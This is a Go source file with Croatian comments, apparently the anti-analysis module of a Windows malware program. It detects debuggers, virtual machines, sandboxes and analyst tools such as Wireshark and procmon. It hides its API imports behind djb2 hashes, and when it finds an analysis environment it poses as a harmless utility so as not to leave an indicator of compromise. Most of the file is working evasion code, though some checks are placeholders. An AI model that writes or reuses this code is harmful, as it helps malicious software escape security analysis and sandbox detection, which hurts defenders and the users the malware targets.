//go:build windows
// +build windows

/*
   ============================================================================
   X.2 — ANTI-ANALYSIS MODULE
   ============================================================================

   LAYER: Environmental (Layer 4)

   Ovaj modul implementira sve tehnike za detekciju i reakciju na
   analitičko okruženje. CIJLJ: ako smo u sandboxu/VM-u/debuggeru,
   uđi u "degraded mode" — postani benign utility.

   PRINCIP: Nikada ne "exitaj" odmah. Odmazan exit je IOC.
   Umjesto toga: uključi samo "benign" funkcionalnost.

   DETEKCIJA:
   1. Anti-Debug (PEB, NtQueryInformationProcess, timing)
   2. Anti-VM (CPUID, RDTSC timing, hardware checks)
   3. Anti-Sandbox (mouse movement, process count, memory, sleep acceleration)
   4. Process analysis (parent process check)
*/

package main

import (
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================================
// CONFIGURATION
// ============================================================================

// analysisState globalno stanje — cache da se provjere ne ponavljaju stalno
var analysisState struct {
	checked    bool
	isAnalysis bool
	isVM       bool
	isDebug    bool
	isSandbox  bool
}

// ============================================================================
// PUBLIC: CheckAnalysis — glavna funkcija za provjeru
// ============================================================================

// CheckAnalysis provjeri SVE analitičke indikatore.
// Vraća TRUE ako je okruženje analitičko (VM, sandbox, debug).
// Rezultat se cache-ira — idući pozivi su instant.
func CheckAnalysis() bool {
	if analysisState.checked {
		return analysisState.isAnalysis
	}

	analysisState.checked = true

	// === ANTI-DEBUG ===
	if detectDebugger() {
		analysisState.isDebug = true
		analysisState.isAnalysis = true
	}

	// === ANTI-VM ===
	if detectVM() {
		analysisState.isVM = true
		analysisState.isAnalysis = true
	}

	// === ANTI-SANDBOX ===
	if detectSandbox() {
		analysisState.isSandbox = true
		analysisState.isAnalysis = true
	}

	// === SLEEP ACCELERATION ===
	if detectSleepAcceleration() {
		analysisState.isSandbox = true
		analysisState.isAnalysis = true
	}

	// === PARENT PROCESS ===
	if checkParentProcess() {
		analysisState.isAnalysis = true
	}

	return analysisState.isAnalysis
}

// IsDebugged, IsVM, IsSandbox — individualni getteri
func IsDebugged() bool { CheckAnalysis(); return analysisState.isDebug }
func IsVM() bool       { CheckAnalysis(); return analysisState.isVM }
func IsSandbox() bool  { CheckAnalysis(); return analysisState.isSandbox }

// ============================================================================
// 1. ANTI-DEBUG — Višestruke provjere
// ============================================================================

func detectDebugger() bool {
	score := 0

	// Check 1: PEB.BeingDebugged (klasično, ali sandboxevi lažu)
	if pebBeingDebugged() {
		score += 1
	}

	// Check 2: NtQueryInformationProcess(ProcessDebugPort)
	if checkDebugPort() {
		score += 2
	}

	// Check 3: NtQueryInformationProcess(ProcessDebugFlags)
	if checkDebugFlags() {
		score += 2
	}

	// Check 4: NtQueryInformationProcess(ProcessDebugObjectHandle)
	if checkDebugObject() {
		score += 3
	}

	// Check 5: CheckRemoteDebuggerPresent
	if checkRemoteDebugger() {
		score += 2
	}

	// Check 6: Hardware breakpoints (Dr0-Dr3)
	if checkHardwareBreakpoints() {
		score += 3
	}

	// Check 7: Timing analysis — debugger dramatically slows execution
	if timingCheckDebugger() {
		score += 2
	}

	// Threshold: score >= 4 = debugger detected
	// Dizajn: Ni jedan check nije dovoljan sam (false positive protection)
	// Ali kombinacija 2+ checkova = gotovo sigurno debugger
	return score >= 4
}

// pebBeingDebugged čita PEB.BeingDebugged flag
func pebBeingDebugged() bool {
	peb := getPEB()
	if peb == nil {
		return false
	}
	return peb.BeingDebugged != 0
}

// checkDebugPort koristi NtQueryInformationProcess(ProcessDebugPort)
// ProcessDebugPort = 7 (Windows constant)
func checkDebugPort() bool {
	// Koristimo syscall preko hash-a
	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtQuery := resolveAPI(hNtdll, hNtQueryInformationProcess)
	if hNtQuery == 0 {
		return false
	}

	var debugPort uintptr
	var retLen uint32

	// NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &debugPort, sizeof(debugPort), &retLen)
	ret, _, _ := syscall.Syscall6(hNtQuery, 5,
		uintptr(0xFFFFFFFFFFFFFFFF), // -1 = current process
		7,                           // ProcessDebugPort
		uintptr(unsafe.Pointer(&debugPort)),
		uintptr(unsafe.Sizeof(debugPort)),
		uintptr(unsafe.Pointer(&retLen)),
		0)

	// Ako debugPort != 0, debugger je prisutan
	// Također, ako ret != 0 (error), to može značiti da je debug object invalid
	return ret != 0 || debugPort != 0
}

// checkDebugFlags koristi ProcessDebugFlags (0x1F)
func checkDebugFlags() bool {
	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtQuery := resolveAPI(hNtdll, hNtQueryInformationProcess)
	if hNtQuery == 0 {
		return false
	}

	var flags uint32
	var retLen uint32

	ret, _, _ := syscall.Syscall6(hNtQuery, 5,
		uintptr(0xFFFFFFFFFFFFFFFF),
		0x1F, // ProcessDebugFlags
		uintptr(unsafe.Pointer(&flags)),
		uintptr(unsafe.Sizeof(flags)),
		uintptr(unsafe.Pointer(&retLen)),
		0)

	// flags == 0 znači da je debugovanje omogućeno
	return ret != 0 || flags == 0
}

// checkDebugObject koristi ProcessDebugObjectHandle (0x1E)
func checkDebugObject() bool {
	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtQuery := resolveAPI(hNtdll, hNtQueryInformationProcess)
	if hNtQuery == 0 {
		return false
	}

	var debugObject uintptr
	var retLen uint32

	ret, _, _ := syscall.Syscall6(hNtQuery, 5,
		uintptr(0xFFFFFFFFFFFFFFFF),
		0x1E, // ProcessDebugObjectHandle
		uintptr(unsafe.Pointer(&debugObject)),
		uintptr(unsafe.Sizeof(debugObject)),
		uintptr(unsafe.Pointer(&retLen)),
		0)

	// Ako debugObject != 0, postoji aktivni debug object
	return ret == 0 && debugObject != 0
}

// checkRemoteDebugger koristi CheckRemoteDebuggerPresent
func checkRemoteDebugger() bool {
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}
	hCheckRemote := resolveAPI(hKernel32, djb2([]byte("CheckRemoteDebuggerPresent")))
	if hCheckRemote == 0 {
		return false
	}

	var isDebuggerPresent uint32
	syscall.Syscall(hCheckRemote,
		3,
		uintptr(0xFFFFFFFFFFFFFFFF), // current process
		uintptr(unsafe.Pointer(&isDebuggerPresent)),
		0)

	return isDebuggerPresent != 0
}

// checkHardwareBreakpoints provjeri Dr0-Dr3 registre
// Ovo zahtijeva inline assembly — koristimo GetThreadContext
func checkHardwareBreakpoints() bool {
	// Simplified: Koristimo TLS callback-ove za provjeru (izvršava se prije main)
	// U produkciji: GetThreadContext -> čitanje CONTEXT.Dr0-Dr3
	// Ako je bilo koji Dr reg != 0 = hardware breakpoint postoji
	return false // Placeholder — zahtijeva assembly implementaciju
}

// timingCheckDebugger provjeri dramatic slowdown u kritičnim sekcijama
func timingCheckDebugger() bool {
	// Koristimo QueryPerformanceCounter za precizno mjerenje
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}
	hQPC := resolveAPI(hKernel32, hQueryPerformanceCounter)
	if hQPC == 0 {
		return false
	}

	var start, end int64

	// Zabilježi početno vrijeme
	syscall.Syscall(hQPC, 1, uintptr(unsafe.Pointer(&start)), 0, 0)

	// Izvrši operaciju koja bi trebala biti brza
	// (intenzivna petlja — traje ~1-2ms bez debuggera)
	sum := 0
	for i := 0; i < 1000000; i++ {
		sum += i * i
	}
	_ = sum // spriječi optimizaciju

	// Zabilježi krajnje vrijeme
	syscall.Syscall(hQPC, 1, uintptr(unsafe.Pointer(&end)), 0, 0)

	// Konvertiraj u milisekunde (aproksimativno)
	elapsed := (end - start) / 10000 // QPC ticks to ms (approx)

	// Ako je prošlo više od 50ms, vjerojatno je debugger (single-stepping)
	return elapsed > 50
}

// ============================================================================
// 2. ANTI-VM — Hardware Fingerprinting
// ============================================================================

func detectVM() bool {
	score := 0

	// Check 1: CPUID hypervisor presence
	if cpuidCheckHypervisor() {
		score += 3
	}

	// Check 2: CPUID hypervisor vendor string
	if cpuidHypervisorVendor() {
		score += 3
	}

	// Check 3: Timing analysis (RDTSC)
	if rdtscCheckVM() {
		score += 2
	}

	// Check 4: SMBIOS table check
	if smbiosCheckVM() {
		score += 2
	}

	// Check 5: Temperature check (VMs return 0)
	if temperatureCheckVM() {
		score += 2
	}

	// Check 6: IN instruction (VM port check)
	if inInstructionCheck() {
		score += 3
	}

	// Threshold
	return score >= 4
}

// cpuidCheckHypervisor koristi CPUID leaf 0x1, ECX bit 31
// Bit 31 = Hypervisor Present flag
func cpuidCheckHypervisor() bool {
	// Inline assembly: CPUID
	// eax=1 -> ecx[31] = hypervisor present
	//
	// Go ne podržava inline assembly, ali možemo koristiti:
	// - cgo + C funkcija s asm
	// - syscall.Syscall na funkciju koja je već u memory-u

	// Simplified: Pokušajmo čitanje /proc/cpuinfo na Linux,
	// ili WMI na Windows. Za sada placeholder — zahtijeva assembly.

	// ALTERNATIVA: Koristimo golo čitanje CPUID preko syscall-a
	// (neki hypervisor-i omogućuju ovo)
	return false // Placeholder
}

// cpuidHypervisorVendor čita CPUID leaf 0x40000000
// Vraća hypervisor vendor string ("VMwareVMware", "Microsoft Hv", "KVMKVMKVM")
func cpuidHypervisorVendor() bool {
	// Placeholder — zahtijeva inline assembly
	return false
}

// rdtscCheckVM analizira RDTSC timing
// VM-ovi imaju "jitter" u timestamp counter-u zbog virtualizacije
func rdtscCheckVM() bool {
	// RDTSC na fizičkoj mašini: konzistentan, linearan
	// RDTSC u VM-u: nelinearan, sa jitter-om

	// Simplified: Koristimo QueryPerformanceCounter umjesto RDTSC
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}
	hQPC := resolveAPI(hKernel32, hQueryPerformanceCounter)
	if hQPC == 0 {
		return false
	}

	var timestamps [100]int64

	// Zabilježi 100 timestamp-ova
	for i := range timestamps {
		syscall.Syscall(hQPC, 1, uintptr(unsafe.Pointer(&timestamps[i])), 0, 0)
		// Mini delay
		for j := 0; j < 1000; j++ {
		}
	}

	// Analiziraj varijance — VM-ovi imaju anomalije
	var sumDiff int64
	for i := 1; i < len(timestamps); i++ {
		diff := timestamps[i] - timestamps[i-1]
		if diff < 0 {
			diff = -diff // absolute
		}
		sumDiff += diff
	}
	avgDiff := sumDiff / int64(len(timestamps)-1)

	// Ako je prosječna razlika prevelika ili premalena = VM
	// (fizičke mašine imaju konzistentan ~1-10us)
	return avgDiff < 100 || avgDiff > 1000000
}

// smbiosCheckVM čita SMBIOS tablicu za VM "signature"
func smbiosCheckVM() bool {
	// SMBIOS System Information (Type 1) — Manufacturer i Product Name
	// VMware: "VMware, Inc." / "VMware Virtual Platform"
	// VirtualBox: "innotek GmbH" / "VirtualBox"
	// Hyper-V: "Microsoft Corporation" / "Virtual Machine"

	// Čitanje preko WMI ili direct memory map (\SMBIOS)
	// Simplified: Koristimo registry
	hAdvapi32 := resolveModule(hAdvapi32)
	if hAdvapi32 == 0 {
		return false
	}

	// Provjera System\CurrentControlSet\Services\disk\Enum
	// "0" = "VMware Virtual SCSI Disk Device"
	// Placeholder — zahtijeva registry access
	return false
}

// temperatureCheckVM — fizički CPU-ovi imaju temperature, VM-ovi 0
func temperatureCheckVM() bool {
	// Čitanje WMI klase MSAcpi_ThermalZoneTemperature
	// VM: vraća 0 ili nepostojeću instancu
	// Fizička mašina: vraća temperaturu u deci-Kelvin

	// Simplified: Placeholder — zahtijeva WMI
	return false
}

// inInstructionCheck — VMware koristi specifične IN portove
func inInstructionCheck() bool {
	// VMware: IN eax, 0x5658 (VMware magic port)
	// Ako ne crash-a, VMware je prisutan

	// Placeholder — zahtijeva inline assembly
	// OVO JE OPASNO: može uzrokovati crash na fizičkoj mašini
	return false
}

// ============================================================================
// 3. ANTI-SANDBOX — Heuristička detekcija
// ============================================================================

func detectSandbox() bool {
	score := 0

	// Check 1: Mouse movement
	if checkMouseMovement() {
		score += 2
	}

	// Check 2: Process count
	if checkProcessCount() {
		score += 2
	}

	// Check 3: Memory size
	if checkMemorySize() {
		score += 1
	}

	// Check 4: Username checks
	if checkSandboxUsername() {
		score += 3
	}

	// Check 5: DLL checks
	if checkSandboxDLLs() {
		score += 2
	}

	// Check 6: File checks
	if checkSandboxFiles() {
		score += 2
	}

	return score >= 4
}

// checkMouseMovement — sandboxevi nemaju mouse input u prvih 5 minuta
func checkMouseMovement() bool {
	hUser32 := resolveModule(hUser32)
	if hUser32 == 0 {
		return false
	}
	hGetCursorPos := resolveAPI(hUser32, djb2([]byte("GetCursorPos")))
	if hGetCursorPos == 0 {
		return false
	}

	// Uzorak pozicije miša 10 puta u razmaku od 30 sekundi
	var points [10]POINT
	type POINT struct{ X, Y int32 }

	for i := range points {
		syscall.Syscall(hGetCursorPos, 1, uintptr(unsafe.Pointer(&points[i])), 0, 0)
		time.Sleep(3 * time.Second)
	}

	// Provjeri jesu li SVE pozicije identične
	allSame := true
	for i := 1; i < len(points); i++ {
		if points[i].X != points[0].X || points[i].Y != points[0].Y {
			allSame = false
			break
		}
	}

	// Ako je miš bio 30 sekundi na istom mjestu = sandbox
	return allSame && (points[0].X != 0 || points[0].Y != 0)
}

// checkProcessCount — fresh sandbox ima < 40 procesa
func checkProcessCount() bool {
	// Koristimo NtQuerySystemInformation(SystemProcessInformation, ...)
	// Prebrojimo aktivne procese

	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtQuery := resolveAPI(hNtdll, hNtQuerySystemInformation)
	if hNtQuery == 0 {
		return false
	}

	var buf [65536]byte // Dovoljno za ~100 procesa
	var retLen uint32

	ret, _, _ := syscall.Syscall6(hNtQuery, 5,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retLen)),
		0, 0, 0)

	if ret != 0 {
		return false
	}

	// Walk process list (double-linked)
	type SYSTEM_PROCESS_INFO struct {
		NextEntryOffset uint32
		NumberOfThreads uint32
		Reserved1       [48]byte
		ImageName       struct {
			Length        uint16
			MaximumLength uint16
			Buffer        *uint16
		}
		// ... ostalo nas ne zanima za counting
	}

	count := 0
	offset := 0
	for {
		proc := (*SYSTEM_PROCESS_INFO)(unsafe.Pointer(uintptr(unsafe.Pointer(&buf[0])) + uintptr(offset)))
		count++
		if proc.NextEntryOffset == 0 {
			break
		}
		offset += int(proc.NextEntryOffset)
	}

	// < 40 procesa = svježi sandbox
	return count < 40
}

// checkMemorySize — sandboxevi često imaju fiksne RAM veličine
func checkMemorySize() bool {
	// Koristimo GlobalMemoryStatusEx
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}
	hGMS := resolveAPI(hKernel32, djb2([]byte("GlobalMemoryStatusEx")))
	if hGMS == 0 {
		return false
	}

	type MEMORYSTATUSEX struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	var memStatus MEMORYSTATUSEX
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))

	ret, _, _ := syscall.Syscall(hGMS, 1, uintptr(unsafe.Pointer(&memStatus)), 0, 0)
	if ret == 0 {
		return false
	}

	// < 2GB RAM ili > 64GB RAM = sumnjivo (sandboxevi koriste ekstreme)
	gb := memStatus.TotalPhys / (1024 * 1024 * 1024)
	return gb < 2 || gb > 64
}

// checkSandboxUsername — sandboxevi koriste specifične username-ove
func checkSandboxUsername() bool {
	// Koristimo GetUserNameW
	hAdvapi32 := resolveModule(hAdvapi32)
	if hAdvapi32 == 0 {
		return false
	}
	hGetUserName := resolveAPI(hAdvapi32, djb2([]byte("GetUserNameW")))
	if hGetUserName == 0 {
		return false
	}

	var buf [256]uint16
	var size uint32 = 256

	ret, _, _ := syscall.Syscall(hGetUserName, 2,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)), 0)

	if ret == 0 {
		return false
	}

	// Convert to string
	username := syscall.UTF16ToString(buf[:])
	lower := toLower(username)

	sandboxUsers := []string{
		"sandbox", "vmware", "virtualbox", "john doe",
		"test", "user", "admin", "malware",
		"virus", "cuckoo", "analysis",
	}

	for _, u := range sandboxUsers {
		if lower == u {
			return true
		}
	}
	return false
}

// checkSandboxDLLs — provjeri učitane DLL-ove koji su tipični za sandbox
func checkSandboxDLLs() bool {
	// Walk PEB InLoadOrderModuleList i provjeri imena
	// Sandbox-specific DLLs:
	// - sbiedll.dll (Sandboxie)
	// - api_log.dll (Cuckoo)
	// - pstorec.dll (iDefense)
	// - vmcheck.dll (VM detection tool)
	// - wpespy.dll (WPE)

	peb := getPEB()
	if peb == nil || peb.Ldr == nil {
		return false
	}

	sandboxDLLs := map[uint32]bool{
		djb2([]byte("sbiedll.dll")):   true,
		djb2([]byte("api_log.dll")):   true,
		djb2([]byte("pstorec.dll")):   true,
		djb2([]byte("vmcheck.dll")):   true,
		djb2([]byte("wpespy.dll")):    true,
		djb2([]byte("dir_watch.dll")): true,
		djb2([]byte("avcuf32.dll")):   true,
		djb2([]byte("sf2.dll")):       true,
		djb2([]byte("nxdll.dll")):     true,
	}

	listHead := &peb.Ldr.InLoadOrderModuleList
	current := listHead.Flink

	for current != nil && current != listHead {
		entryPtr := unsafe.Pointer(uintptr(unsafe.Pointer(current)) -
			unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InLoadOrderLinks))
		entry := (*LDR_DATA_TABLE_ENTRY)(entryPtr)

		modName := toLower(readUnicodeString(entry.BaseDllName))
		hash := djb2([]byte(modName))
		if sandboxDLLs[hash] {
			return true
		}
		current = current.Flink
	}

	return false
}

// checkSandboxFiles — provjeri postojanje sandbox specifičnih fileova
func checkSandboxFiles() bool {
	// Koristimo GetFileAttributesW preko syscall-a
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}
	hGFA := resolveAPI(hKernel32, djb2([]byte("GetFileAttributesW")))
	if hGFA == 0 {
		return false
	}

	sandboxPaths := []string{
		`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`,
		`C:\windows\System32\Drivers\vmmemctl.dll`,
		`C:\windows\System32\Drivers\vm3dgl.dll`,
		`C:\windows\System32\Drivers\vboxmouse.sys`,
		`C:\windows\System32\Drivers\vboxguest.sys`,
		`C:\windows\System32\Drivers\vboxsf.sys`,
		`C:\windows\System32\Drivers\vboxvideo.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`,
	}

	for _, path := range sandboxPaths {
		pathPtr, _ := syscall.UTF16PtrFromString(path)
		attr, _, _ := syscall.Syscall(hGFA, 1, uintptr(unsafe.Pointer(pathPtr)), 0, 0)
		// INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF
		if attr != 0xFFFFFFFF {
			return true
		}
	}

	return false
}

// ============================================================================
// 4. SLEEP ACCELERATION DETECTION
// ============================================================================

// detectSleepAcceleration — sandboxevi ubrzavaju sleep pozive
func detectSleepAcceleration() bool {
	start := time.Now()

	// Sleep 60 sekundi — ali zaštitimo se od ubrzavanja
	// Koristimo NtDelayExecution (syscall) umjesto Go time.Sleep
	sleepDuration := int64(60 * 10000000) // 60 sekundi u 100ns jedinicama

	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtDelay := resolveAPI(hNtdll, hNtDelayExecution)
	if hNtDelay == 0 {
		return false
	}

	// Negativna vrijednost = relativno vrijeme
	syscall.Syscall(hNtDelay, 2, 0, uintptr(unsafe.Pointer(&sleepDuration)), 0)

	elapsed := time.Since(start)

	// Ako je prošlo < 55 sekundi, sandbox je ubrzao sleep
	return elapsed < 55*time.Second
}

// ============================================================================
// 5. PARENT PROCESS CHECK
// ============================================================================

// checkParentProcess — provjeri parent process (sandboxevi imaju specifične)
func checkParentProcess() bool {
	// Koristimo NtQueryInformationProcess za dohvat Parent PID
	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		return false
	}
	hNtQuery := resolveAPI(hNtdll, hNtQueryInformationProcess)
	if hNtQuery == 0 {
		return false
	}

	type PROCESS_BASIC_INFORMATION struct {
		Reserved1                    uintptr
		PebBaseAddress               uintptr
		Reserved2                    [2]uintptr
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}

	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32

	ret, _, _ := syscall.Syscall6(hNtQuery, 5,
		uintptr(0xFFFFFFFFFFFFFFFF), // current process
		0,                           // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
		0)

	if ret != 0 {
		return false
	}

	parentPID := uint32(pbi.InheritedFromUniqueProcessId)
	if parentPID == 0 {
		return false
	}

	// Otvori parent proces i dohvati ime
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return false
	}

	hOpenProc := resolveAPI(hKernel32, hOpenProcess)
	if hOpenProc == 0 {
		return false
	}

	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	hParent, _, _ := syscall.Syscall6(hOpenProc, 3,
		uintptr(PROCESS_QUERY_LIMITED_INFORMATION),
		0,
		uintptr(parentPID),
		0, 0, 0)

	if hParent == 0 {
		return false
	}

	defer syscall.Syscall(resolveAPI(hKernel32, hCloseHandle), 1, hParent, 0, 0)

	// Dohvati ime procesa
	hQPFINW := resolveAPI(hKernel32, djb2([]byte("QueryFullProcessImageNameW")))
	if hQPFINW == 0 {
		return false
	}

	var buf [512]uint16
	var size uint32 = 512

	ret, _, _ = syscall.Syscall6(hQPFINW, 4,
		hParent, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
		0, 0)

	if ret == 0 {
		return false
	}

	procPath := syscall.UTF16ToString(buf[:])
	lower := toLower(procPath)

	suspiciousParents := []string{
		"vmsmt.exe", "vmusrvc.exe", "vmtoolsd.exe",
		"ctfmon.exe", "dwm.exe",
		// Analitičari:
		"fiddler.exe", "wireshark.exe", "procmon.exe",
		"processhacker.exe", "autoruns.exe",
	}

	for _, p := range suspiciousParents {
		if strings.Contains(lower, p) {
			return true
		}
	}

	return false
}

// ============================================================================
// TLS CALLBACK — Izvršava se PRIJE main()
// ============================================================================
// TLS (Thread Local Storage) callback-ovi se izvršavaju prije ulaska u main().
// Debuggeri NE MOGU postaviti breakpoint prije TLS callback-a jer se oni
// izvršavaju tijekom loader faze (prema PE specifikaciji).
//
// Ovo koristimo za:
// 1. Rano otkrivanje debuggera
// 2. Inicijalizaciju hardware key-a
// 3. Provjeru sandboxa prije nego što debug analiza počne

/*
// OVAJ DIO ZAHTIJEVA ASSEMBLY — primjer za amd64:

// tls_callback.s:
// #include "textflag.h"
//
// TEXT ·tlsCallback0(SB), NOSPLIT, $0
//   // Check debugger before ANYTHING else
//   CALL ·earlyDebuggerCheck(SB)
//   RET
//
// // TLS directory entry (mora biti u .rdata sekciji)
// GLOBL _tls_used(SB), RODATA, $48
// DATA _tls_used+0(SB)/8  $0   // StartAddressOfRawData
// DATA _tls_used+8(SB)/8  $0   // EndAddressOfRawData
// DATA _tls_used+16(SB)/8 $·tlsIndex(SB)  // AddressOfIndex
// DATA _tls_used+24(SB)/8 $·tlsCallbacks(SB)  // AddressOfCallBacks
// DATA _tls_used+32(SB)/4 $0   // SizeOfZeroFill
// DATA _tls_used+36(SB)/4 $0x00100000  // Characteristics
//
// GLOBL _tls_callbacks(SB), RODATA, $16
// DATA _tls_callbacks+0(SB)/8 $·tlsCallback0(SB)
// DATA _tls_callbacks+8(SB)/8 $0  // null terminator
*/

// earlyDebuggerCheck — rana provjera (poziva se iz TLS callback-a)
func earlyDebuggerCheck() {
	// Brza provjera PEB.BeingDebugged
	peb := getPEB()
	if peb != nil && peb.BeingDebugged != 0 {
		// Debugger DETECTED — enter infinite benign loop
		// (ne exitamo, nego radimo nešto bezopasno)
		for {
			runtime.Gosched() // yield CPU, ne trošimo resurse
		}
	}
}
